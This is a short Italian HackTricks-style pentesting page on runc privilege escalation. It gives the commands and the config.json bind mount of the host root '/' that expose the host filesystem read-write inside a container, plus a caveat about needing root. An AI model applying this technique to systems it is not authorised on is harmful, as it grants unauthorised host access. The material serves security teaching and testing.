# Elevazione di privilegi di RunC

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Se vuoi saperne di più su **runc** controlla la seguente pagina:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se scopri che `runc` è installato nell'host, potresti essere in grado di **eseguire un container montando la cartella root / dell'host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Questo non funzionerà sempre poiché l'operazione predefinita di runc è eseguire come root, quindi eseguirlo come utente non privilegiato semplicemente non può funzionare (a meno che tu non abbia una configurazione senza root). Rendere una configurazione senza root quella predefinita non è generalmente una buona idea perché ci sono diverse restrizioni all'interno dei contenitori senza root che non si applicano al di fuori dei contenitori senza root.

{{#include ../../banners/hacktricks-training.md}}
